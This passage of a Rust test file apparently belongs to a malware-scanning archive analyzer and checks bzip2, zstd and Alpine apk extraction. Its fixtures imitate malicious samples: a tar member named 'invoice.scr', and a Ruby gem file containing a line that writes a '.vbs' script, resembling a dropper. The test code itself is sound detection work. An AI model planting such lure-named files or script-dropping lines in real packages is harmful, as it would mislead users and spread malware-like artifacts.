            assert!(path.exists(), "extracted file should exist: {}", path_str);
            let content = std::fs::read(path).unwrap();
            assert_eq!(
                content, original_content,
                "decompressed content should match original"
            );
        }
    }

    #[test]
    fn test_extract_dir_standalone_bz2_wrapped_tar_without_tar_extension() {
        let temp_dir = tempfile::tempdir().expect("create temp dir");
        let extract_dir = tempfile::tempdir().expect("create extract dir");
        let bz2_path = temp_dir.path().join("payload.unknown");

        let mut tar_data = Vec::new();
        {
            let contents = b"inner executable placeholder";
            let mut header = [0u8; 512];
            header[0.."invoice.scr".len()].copy_from_slice(b"invoice.scr");
            header[100..108].copy_from_slice(b"0000755\0");
            header[108..116].copy_from_slice(b"0000000\0");
            header[116..124].copy_from_slice(b"0000000\0");
            let size = format!("{:011o}\0", contents.len());
            header[124..136].copy_from_slice(size.as_bytes());
            header[136..148].copy_from_slice(b"00000000000\0");
            header[148..156].fill(b' ');
            header[156] = b'0';
            let checksum = header.iter().map(|b| *b as u32).sum::<u32>();
            let checksum = format!("{:06o}\0 ", checksum);
            header[148..156].copy_from_slice(checksum.as_bytes());

            tar_data.extend_from_slice(&header);
            tar_data.extend_from_slice(contents);
            let padding = (512 - (contents.len() % 512)) % 512;
            tar_data.extend(std::iter::repeat_n(0, padding));
            tar_data.extend(std::iter::repeat_n(0, 1024));
        }

        {
            let file = File::create(&bz2_path).expect("create bz2");
            let mut enc = bzip2::write::BzEncoder::new(file, bzip2::Compression::default());
            enc.write_all(&tar_data).expect("write bz2 tar");
            enc.finish().expect("finish bz2");
        }

        let config = SampleExtractionConfig::new(extract_dir.path().to_path_buf());
        let analyzer = ArchiveAnalyzer::new()
            .with_sample_extraction(config)
            .with_analysis_options(Arc::new(crate::AnalysisOptions {
                all_files: true,
                ..crate::AnalysisOptions::default()
            }));
        let report = analyzer.analyze(&bz2_path).expect("analyze .bz2 tar");

        assert!(
            report.files.iter().any(|f| f.path.ends_with("invoice.scr")),
            "bzip2-wrapped tar should recurse into tar members, got files: {:?}",
            report.files.iter().map(|f| &f.path).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_extract_dir_standalone_zstd() {
        // Standalone .zst — the specific format mentioned in the bug report
        #[allow(clippy::expect_used)]
        let temp_dir = tempfile::tempdir().expect("create temp dir");
        #[allow(clippy::expect_used)]
        let extract_dir = tempfile::tempdir().expect("create extract dir");
        let zst_path = temp_dir.path().join("meta.json.zst");

        // Create a standalone .zst file
        let original_content = b"{\"name\": \"test-package\", \"version\": \"1.0.0\"}";
        {
            let compressed = zstd::encode_all(Cursor::new(original_content), 3).unwrap();
            std::fs::write(&zst_path, compressed).unwrap();
        }

        let config = SampleExtractionConfig::new(extract_dir.path().to_path_buf());
        let analyzer = ArchiveAnalyzer::new().with_sample_extraction(config);
        #[allow(clippy::expect_used)]
        let report = analyzer.analyze(&zst_path).expect("analyze .zst");

        // The decompressed file should be extracted to extract_dir
        let extracted_files: Vec<_> = report
            .files
            .iter()
            .filter_map(|f| f.extracted_path.as_ref())
            .collect();
        assert!(
            !extracted_files.is_empty(),
            "standalone .zst decompressed content should be extracted, got files: {:?}",
            report.files.iter().map(|f| &f.path).collect::<Vec<_>>()
        );

        // Verify the decompressed content matches
        for path_str in &extracted_files {
            let path = std::path::Path::new(path_str);
            assert!(path.exists(), "extracted file should exist: {}", path_str);
            let content = std::fs::read(path).unwrap();
            assert_eq!(
                content, original_content,
                "decompressed .zst content should match original"
            );
        }
    }

    /// Build one gzip-compressed tar segment from `(path, contents)` members.
    /// A real apk is several of these concatenated; tests build the segments
    /// separately and join them so the fixture matches the on-disk format.
    #[allow(clippy::expect_used)]
    fn apk_gzip_tar_segment(members: &[(&str, &[u8])]) -> Vec<u8> {
        use flate2::Compression;
        use flate2::write::GzEncoder;
        use tar::Builder;

        let enc = GzEncoder::new(Vec::new(), Compression::default());
        let mut tar_builder = Builder::new(enc);
        for (path, contents) in members {
            let mut header = tar::Header::new_gnu();
            header.set_path(path).expect("set tar path");
            header.set_size(contents.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar_builder
                .append(&header, *contents)
                .expect("append member");
        }
        tar_builder
            .into_inner()
            .expect("finish tar")
            .finish()
            .expect("finish gzip")
    }

    #[test]
    fn test_alpine_apk_detected_via_gzip_tar_path() {
        #[allow(clippy::expect_used)]
        let temp_dir = tempfile::tempdir().expect("create temp dir");
        let apk_path = temp_dir.path().join("sample.apk");

        {
            // A real apk concatenates independent gzip streams: the control
            // segment (`.PKGINFO`) followed by the data segment (installed
            // files). The data member must live in its *own* segment — a single
            // combined tar would mask the multi-segment walking this verifies.
            let control = apk_gzip_tar_segment(&[(
                ".PKGINFO",
                b"pkgname = ruby3.2-public_suffix\npkgver = 6.0.0-r0\n",
            )]);
            let data = apk_gzip_tar_segment(&[(
                "usr/lib/ruby/gems/3.2.0/gems/public_suffix-6.0.1/lib/public_suffix.rb",
                b"File.open(\"the_Score.vbs\", \"w\")\n",
            )]);

            let mut file = File::create(&apk_path).unwrap();
            file.write_all(&control).unwrap();
            file.write_all(&data).unwrap();
        }

        let analyzer = ArchiveAnalyzer::new();
        #[allow(clippy::expect_used)]
        let report = analyzer.analyze(&apk_path).expect("analyze alpine apk");

        // Alpine `.apk` now carries its own ecosystem type (routed through the
        // gzip-tar extraction path, which the member assertion below verifies).
        assert_eq!(report.target.file_type, "apk_alpine");
        assert!(
            report
                .files
                .iter()
                .any(|f| f.path.ends_with("public_suffix.rb")),
            "expected ruby archive member to be analyzed, got files: {:?}",
            report.files.iter().map(|f| &f.path).collect::<Vec<_>>()
        );
        assert!(
            report
                .structure
                .iter()
                .any(|s| s.id == "archive/apk_alpine"),
            "expected apk_alpine structural marker, got: {:?}",
            report.structure.iter().map(|s| &s.id).collect::<Vec<_>>()
        );
    }
}
